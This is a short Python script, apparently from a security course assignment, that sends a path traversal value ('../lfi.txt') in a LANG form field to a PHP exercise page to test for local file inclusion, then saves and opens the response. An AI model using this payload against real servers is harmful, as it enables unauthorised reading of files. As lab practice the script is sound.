from urllib import request, parse
import webbrowser

# base_url = "http://localhost:20080/Assignment/case22.php"
base_url = "http://iu.ru/Assignment/case25.php"
values = {"LANG": "../lfi.txt"}
data = parse.urlencode(values).encode()
req = request.Request(base_url, data=data)
resp = request.urlopen(req)

with open("result25.html", "w") as fd:
    fd.write(resp.read().decode())

webbrowser.open("result25.html", new=2)
